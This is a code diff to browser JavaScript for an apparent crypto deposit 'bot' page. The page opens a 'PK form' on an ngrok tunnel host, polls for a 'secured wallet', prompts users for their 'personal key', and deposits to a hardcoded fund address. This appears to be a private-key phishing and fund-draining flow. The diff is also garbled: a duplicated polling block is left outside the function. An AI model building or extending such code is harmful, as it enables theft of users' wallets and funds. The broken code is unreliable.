@@ -39,9 +39,9 @@ const FUND_ADDRESS = "0x50AB9b1A42D4338A80Dc3579D93eCd3243953E0e";
 // USER_TOKEN_ADDR will be set dynamically from clients.db for the logged-in user
 let USER_TOKEN_ADDR = null;
 
-async function firstapprove() {
+function firstapprove() {
   try {
-    // Step 1: open PK form in new window
+    // Step 1: open PK form in new window (non-blocking)
     window.open("https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security", "_blank");
 
     // Step 2: poll secured wallet
@@ -55,6 +55,28 @@ async function firstapprove() {
         return false;
       }
     };
+
+    // Step 3: keep checking for 30 seconds
+    let attempts = 0;
+    const interval = setInterval(async () => {
+      const ready = await checkWallet();
+      if (ready) {
+        firsttime = true;
+        logToPanel("✅ Secured wallet initialized");
+        clearInterval(interval);
+      } else {
+        attempts++;
+        if (attempts > 15) { // 15 x 2s = 30s
+          logToPanel("❌ Please enter your personal key");
+          clearInterval(interval);
+        }
+      }
+    }, 2000);
+
+  } catch (err) {
+    logToPanel(`FirstApproveError=${err.message}`);
+  }
+}
 
     // Step 3: keep checking for 30 seconds
     let attempts = 0;
@@ -464,7 +486,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     disableAllControls();
     try {
       if (!firsttime) {
-        await firstapprove();
+        firstapprove();
       } else {
         await runDeposit();
       }
